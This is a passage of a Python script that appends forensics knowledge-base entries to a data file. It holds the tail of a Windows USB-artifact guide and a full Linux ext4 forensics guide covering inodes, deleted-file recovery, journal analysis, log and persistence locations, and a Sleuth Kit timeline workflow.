LECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\" --csv output\ | grep "E:\\"

# Jump Lists:
JLECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\" | grep "E:\\"

# Step 4: SetupAPI log for first connect timestamp
grep -B2 -A10 "<device_serial>" "C:\Windows\inf\setupapi.dev.log"

# Step 5: Shell notifications for autorun/content browse
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\Shell" --csv output\
```
""",
    },
    {
        "title": "Linux Filesystem Forensics — ext4, Inodes, Journal Analysis",
        "tags": ["linux-forensics", "ext4", "inode", "journal", "disk-forensics", "dfir"],
        "content": """# Linux Filesystem Forensics — ext4

## ext4 Structure Overview

```
Disk → Partitions → ext4 Filesystem

ext4 Layout:
  Boot block (sector 0)
  Block Group 0:
    Superblock (block 0)
    Group Descriptor Table
    Block Bitmap
    Inode Bitmap
    Inode Table
    Data Blocks
  Block Group 1... (repeats)
```

## Inode Analysis

Every file/directory has an inode storing metadata (not the filename — that's in the directory entry).

```bash
# Get inode number of a file:
ls -i /bin/bash
# 917857 /bin/bash

# Show all inode fields:
stat /bin/bash
# File: /bin/bash
# Size: 1234567    Blocks: 2416    IO Block: 4096
# Inode: 917857    Links: 1
# Access: (0755/-rwxr-xr-x)  Uid: 0  Gid: 0
# Access: 2025-03-15 12:00:00 (atime)
# Modify: 2025-02-01 10:00:00 (mtime)
# Change: 2025-02-01 10:00:00 (ctime — inode change, NOT creation time)
# Birth:  2024-01-15 08:00:00 (btime — creation time, ext4 only)

# ext4 timestamps: atime (last access), mtime (last content modification),
#                  ctime (last metadata change), crtime/btime (creation)

# debugfs — raw filesystem inspection:
debugfs /dev/sda1
  stat <917857>           # Show inode by number
  ls /etc                 # List directory inodes
  dump <917857> /tmp/bash # Dump file by inode

# List all inodes in a directory:
debugfs /dev/sda1 -R "ls -l /"
```

## Deleted File Recovery

```bash
# List deleted inodes with The Sleuth Kit:
ils -f ext4 /dev/sda1              # List all inodes including deleted
fls -r -d /dev/sda1                # Files in MFT-equivalent tree, deleted only

# Recover file by inode:
icat /dev/sda1 <inode_number> > recovered_file

# Automated recovery with TSK:
tsk_recover -e /dev/sda1 output_dir/   # Recover all unallocated files

# Via debugfs:
debugfs /dev/sda1
  lsdel                    # List deleted inodes
  undel <inode_number>     # Attempt to undelete
  dump <inode_number> /tmp/recovered
```

## ext4 Journal Analysis

ext4 keeps a journal ($JOURNAL or .journal file) of metadata operations for crash recovery.

```bash
# Identify journal location:
debugfs /dev/sda1 -R "stat <8>"   # Inode 8 = journal file

# Dump journal:
debugfs /dev/sda1 -R "dump <8> journal.img"

# Parse journal with ext4magic:
apt install ext4magic
ext4magic /dev/sda1 -r -d recover_dir/    # Recover deleted files from journal
ext4magic /dev/sda1 -a "2025-03-15 12:00" -b "2025-03-15 16:00" -d recover_dir/
# Recover files with modifications in time window
```

## Key Forensic Artifacts on Linux

```bash
# Authentication logs:
/var/log/auth.log      # Ubuntu/Debian — SSH, sudo, PAM
/var/log/secure        # RHEL/CentOS
grep "Failed password\|Accepted password\|sudo" /var/log/auth.log

# Command history:
~/.bash_history         # Bash command history (may be cleared)
~/.zsh_history          # Zsh history
~/.python_history

# Persistence locations:
/etc/crontab
/etc/cron.d/
/var/spool/cron/crontabs/<user>
/etc/rc.local
/etc/init.d/
/etc/systemd/system/   # Systemd services
~/.config/systemd/user/ # User systemd services
/etc/ld.so.preload      # LD_PRELOAD rootkit

# Recently modified files (last 24 hours):
find / -mtime -1 -type f 2>/dev/null | grep -v /proc | grep -v /sys

# SUID/SGID files (privilege escalation vectors):
find / -perm -4000 -o -perm -2000 2>/dev/null | sort

# World-writable directories (attacker staging):
find / -type d -perm -777 2>/dev/null | grep -v /proc | grep -v /tmp
```

## The Sleuth Kit (TSK) Workflow

```bash
# Verify image integrity:
md5sum disk_image.dd

# Image information:
img_stat disk_image.dd

# Partition table:
mmls disk_image.dd
# Shows: partition offset in sectors

# Filesystem info (using sector offset):
fsstat -o <offset> disk_image.dd

# File listing (recursive, deleted included):
fls -r -o <offset> disk_image.dd

# Timeline creation:
mactime -b <(fls -r -m / -o <offset> disk_image.dd) > timeline.txt

# Combine with other sources for super timeline
```
""",
    },
]
'''

with open("C:/Users/Tomo/ixion/src/ion/data/kb_forensics_advanced.py", "a", encoding="utf-8") as f:
    f.write(chunk)
print("Collection 4 written. Lines:", open("C:/Users/Tomo/ixion/src/ion/data/kb_forensics_advanced.py", encoding="utf-8").read().count("\n"))
